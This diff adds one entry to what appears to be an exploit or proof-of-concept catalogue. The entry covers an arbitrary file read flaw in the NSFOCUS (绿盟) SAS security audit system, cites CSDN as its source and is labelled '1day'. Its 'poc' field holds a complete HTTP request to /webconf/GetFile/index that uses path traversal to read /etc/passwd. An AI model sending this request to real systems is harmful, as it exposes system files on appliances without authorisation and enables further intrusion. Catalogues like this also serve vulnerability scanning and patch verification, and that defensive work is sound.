@@ -1,0 +1,8 @@
+vendor = "绿盟"
+name = "绿盟sas安全审计系统任意文件读取漏洞"
+type = "任意文件读取"
+source = "csdn"
+info = "/webconf/GetFile/index"
+date = "08.10"
+poc = "GET /webconf/GetFile/index?path=../../../../../../../etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Connection: close"
+label = "1day"
